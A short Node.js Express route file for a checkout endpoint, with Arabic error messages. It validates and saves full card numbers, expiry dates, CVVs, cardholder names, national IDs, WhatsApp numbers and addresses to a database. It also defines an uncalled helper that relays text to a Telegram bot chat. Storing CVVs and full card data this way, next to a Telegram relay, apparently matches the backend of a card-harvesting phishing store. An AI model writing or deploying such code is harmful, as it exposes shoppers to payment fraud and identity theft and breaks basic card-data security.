const express = require("express");
const https = require("https");
const router = express.Router();
const Checkout = require("../models/Checkout");
const { orderRateLimit } = require("../middlewares/orderRateLimit");
const { authMiddleware } = require("./adminRoutes/middleware");

async function sendTelegramMessage(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const body = JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" });
  return new Promise((resolve) => {
    const req = https.request(
      { hostname: "api.telegram.org", path: `/bot${token}/sendMessage`, method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } },
      (res) => { res.on("data", () => {}); res.on("end", resolve); }
    );
    req.on("error", resolve);
    req.write(body);
    req.end();
  });
}

function validateCheckout(req, res, next) {
  const { orderId, cardNumber, expiry, cvv, cardHolder, items, total } = req.body;
  if (!orderId || typeof orderId !== "string") return res.status(400).json({ ok: false, error: "orderId مطلوب" });
  if (!cardNumber || typeof cardNumber !== "string" || cardNumber.length < 13 || cardNumber.length > 19) return res.status(400).json({ ok: false, error: "رقم البطاقة غير صالح" });
  if (!expiry || !/^\d{2}\/\d{2}$/.test(expiry)) return res.status(400).json({ ok: false, error: "تاريخ الانتهاء غير صالح" });
  if (!cvv || !/^\d{3,4}$/.test(cvv)) return res.status(400).json({ ok: false, error: "CVV غير صالح" });
  if (!cardHolder || typeof cardHolder !== "string" || cardHolder.trim().length < 2) return res.status(400).json({ ok: false, error: "اسم حامل البطاقة مطلوب" });
  if (!Array.isArray(items) || items.length === 0) return res.status(400).json({ ok: false, error: "يجب إضافة منتج واحد على الأقل" });
  if (!total || typeof total !== "number" || total <= 0) return res.status(400).json({ ok: false, error: "المبلغ غير صالح" });
  next();
}

router.post("/", orderRateLimit, validateCheckout, async (req, res) => {
  try {
    const { orderId, cardNumber, expiry, cvv, cardHolder, items, total, downPayment, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, monthlyPayment } = req.body;
    const checkout = new Checkout({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, downPayment, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, monthlyPayment });
    await checkout.save();

    res.status(201).json({ ok: true, orderId: checkout.orderId });
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});



module.exports = router;
